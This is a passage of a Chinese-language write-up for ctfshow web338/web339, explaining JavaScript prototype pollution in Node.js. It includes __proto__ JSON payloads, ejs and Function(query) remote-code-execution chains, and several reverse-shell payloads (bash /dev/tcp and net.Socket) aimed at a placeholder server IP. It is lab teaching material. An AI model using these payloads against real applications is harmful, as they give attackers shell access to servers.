+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>routes/login.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">....</span><br><span class="line">utils.copy(user,req.body);</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，我们不用关心 <code>secert</code> 是否有 <code>ctfshow</code> 这个属性，因为当它找不到这个属性时，它会从它自己的原型里找。</p>
+<p>这里的 <code>secert</code> 是一个数组，然后 <code>utils.copy(user,req.body);</code> 操作是 <code>user</code> 也是数组，也就是我们通过 <code>req.body</code> 即 POST 请求体传入参数，通过 <code>user</code> 污染数组的原型，那么 <code>secert</code> 数组找不到 <code>ctfshow</code> 属性时，会一直往原型找，直到在数组原型中发现 <code>ctfshow</code> 属性值为 <code>36dboy</code> 。那么 <code>if</code> 语句即判断成功，就会输出 flag 了。</p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;ctfshow&quot;</span>: <span class="string">&quot;36dboy&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619686041322-ea3afafd-c050-401e-ac62-92c906083202.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619686041322-ea3afafd-c050-401e-ac62-92c906083202.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>一般遇到这种整套代码，特别是带有 package.json 的，可以尝试 <a target="_blank" rel="noopener" href="https://snyk.io/">snyk</a> ，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619833506599-02525d9f-0a41-4ee3-90e2-62683c6164bf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619833506599-02525d9f-0a41-4ee3-90e2-62683c6164bf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>发现个 <code>ejs</code> 的 RCE</p>
+<p><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先污染参数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836696555-62e2a481-996f-4ff0-a3c2-29a70383cd6b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836696555-62e2a481-996f-4ff0-a3c2-29a70383cd6b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>然后随便请求一下，触发 <code>render</code> 方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836723109-6bdc2f7e-4cec-4da9-84bc-cc1924fd1f03.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836723109-6bdc2f7e-4cec-4da9-84bc-cc1924fd1f03.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>成功反弹 shell</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836758279-1a6d1c18-afe3-4c6c-9721-cea981b25e6c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836758279-1a6d1c18-afe3-4c6c-9721-cea981b25e6c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>不过 snyk 给出的 poc 用 <code>filename</code> 参数利用好像有点问题， 不太清楚为啥。。即</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;filename&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>顺便记录一下 node 项目本地启动方法，在项目文件运行下面命令即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619837473151-eca98d9e-765c-4eee-8161-edcc0328d706.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619837473151-eca98d9e-765c-4eee-8161-edcc0328d706.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>默认端口为 <code>3000</code></p>
+<h2 id="web339-原型链污染"><a href="#web339-原型链污染" class="headerlink" title="web339 原型链污染 +"></a>web339 原型链污染 +</h2><span class='btn'><a class="button"  title='node/v10.19.0'><i class='fas fa-tag'></i>node/v10.19.0</a></span>
+
+<p>题目描述处蓝奏云下载源码</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619686504884-e7563cf5-365e-44d1-acff-1b95a5827a7b.zip">📎web339.zip</a></p>
+<p>和 web338 有点相似，不过不同点是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">....</span><br><span class="line">utils.copy(user,req.body);</span><br><span class="line"><span class="keyword">if</span>(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>flag</code> 是变量，具体值不知</p>
+<p>然后还多了个 <code>api.js</code> ，主要关注这行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.render(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>是不是和 web338 里的参考链接 PHITHON 师傅出的 Code-Breaking 2018 Thejs 如出一辙？即可以 RCE，因为这里可污染点存在的匿名函数调用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619788917182-da9b75b5-e2e0-47ff-bc66-4eee3514dcd6.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619788917182-da9b75b5-e2e0-47ff-bc66-4eee3514dcd6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>仿照题目中的代码，先写个小demo</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">user = &#123;&#125;</span><br><span class="line">body = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return 2233&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line">copy(user, body)</span><br><span class="line">&#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790130420-39ba77d6-b64a-4dd6-8061-1fdf69a019aa.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790130420-39ba77d6-b64a-4dd6-8061-1fdf69a019aa.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>为什么 <code>query</code> 的值是 <code>2233</code> 呢？也就是为啥会被调用了呢？</p>
+<p>首先看看 <code>query</code> 值是如何被改变的，其实就是通过 web338 的原型链污染，即 JS 中所有的对象的原型都可以继承到 <code>Object</code>，然后终点是 <code>null</code> 对象</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790602513-1290e5ea-29bc-41f3-a91c-8b0d93bf0deb.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790602513-1290e5ea-29bc-41f3-a91c-8b0d93bf0deb.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>如 web338 中所说的，当在当前上下文找不到相应对象时，会遍历 <code>Object</code> 对象是否存在相应的属性。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790802183-0104e1c4-0ab1-4bd1-957c-ce38d1551dd8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790802183-0104e1c4-0ab1-4bd1-957c-ce38d1551dd8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>到这里就很清楚的知道了，为什么 <code>query</code> 的值是 <code>&quot;return 2233&quot;</code> ，因为在调用 <code>copy</code> 时，原型链被污染了。</p>
+<p>至于 <code>&#123; query: Function(query)(query)&#125;</code> 为何为 <code>&#123; query: 2233 &#125;</code></p>
+<p>JS 的函数实际上都是一个 <code>Function</code> 对象，它的参数为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Function</span> ([arg1[, arg2[, ...argN]],] functionBody)</span><br></pre></td></tr></table></figure>
+
+<p>写个小demo</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619791459250-37753d01-6c88-4e63-85a7-26100dfe77db.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619791459250-37753d01-6c88-4e63-85a7-26100dfe77db.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>即 <code>Function</code> 对象传入构造函数里的前面参数是函数的形参，当然可以省略，最后的形参写函数体。</p>
+<p>其实作用和 <code>eval</code> 有点类似，详细可以看</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p>
+<p>至此，利用思路明确了，只要污染了 <code>query</code> 对象，就可以执行任意我们想执行的代码，比如反弹个 shell 再获取 flag ~</p>
+<p>然后污染点和 web338 一致，在 <code>login.js</code> 里的 <code>utils.copy(user,req.body);</code> ，代码执行的触发点在 <code>api.js</code> 的 <code>res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;);</code> 处。</p>
+<p>payload ，这里用 nodejs 原生 socket，防止因系统运行环境问题 shell 弹不回来，这里服务器的监听端口为 <code>2233</code> ，然后如何是 windows 系统就把 <code>/bin/sh</code> 换成 <code>cmd.exe</code> 应该就可以了。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>先本地试试，这里服务器监听端口为 <code>2233</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">user = &#123;&#125;</span><br><span class="line">body = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(\&#x27;net\&#x27;),cp = require(\&#x27;child_process\&#x27;),sh = cp.spawn(\&#x27;/bin/sh\&#x27;, []);var client = new net.Socket();client.connect(2233, \&#x27;服务器IP\&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line">copy(user, body)</span><br><span class="line">&#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793178120-2e6e58a4-b750-4c6b-a7de-8cf9a2f60b64.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793178120-2e6e58a4-b750-4c6b-a7de-8cf9a2f60b64.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793198542-377ce54f-3687-4a88-a687-11717244f36e.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793198542-377ce54f-3687-4a88-a687-11717244f36e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>ok，没啥大问题。</p>
+<p>先 POST 一下 <code>login</code> 接口，污染 <code>query</code> 对象</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793434141-8c892952-f7cf-461d-b4f4-b261365597f6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793434141-8c892952-f7cf-461d-b4f4-b261365597f6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>然后直接 POST 一下 <code>api</code> 接口即可。</p>
+<p>emm，发现不行，之后访问 <code>/login</code> 和 <code>/api</code> 接口都是 <code>404 找不到文件</code> ，shell 也反弹不回来。</p>
+<p>试试别人的</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796525635-ef217393-2d02-4228-a2aa-1ce9e7876933.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796525635-ef217393-2d02-4228-a2aa-1ce9e7876933.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796551640-9d0beceb-3b78-4a2e-b77f-19ea45c2cecd.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796551640-9d0beceb-3b78-4a2e-b77f-19ea45c2cecd.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796495423-4c858c2e-cbf8-4c26-96f1-35206b50b05f.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796495423-4c858c2e-cbf8-4c26-96f1-35206b50b05f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>仔细对比了一下，发现了，感觉是命名空间问题，即 <code>require</code> 可能不被识别，尝试把 require 改为 <code>global.process.mainModule.constructor._load</code> ，同样服务器监听端口为 <code>2233</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也是先 POST /login 接口污染 <code>query</code> 对象</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838195166-c3b39c68-4095-4a87-b5b4-793e3c217290.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838195166-c3b39c68-4095-4a87-b5b4-793e3c217290.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>访问下 /api 接口</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838256467-488bab08-9d13-4910-bfcf-2d833730b60d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838256467-488bab08-9d13-4910-bfcf-2d833730b60d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>反弹 shell 并获取 flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838313191-f653eafe-5665-48af-8b1b-ca85b765776c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838313191-f653eafe-5665-48af-8b1b-ca85b765776c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>然后顺便翻了个链接，好像确实如此~</p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a></p>
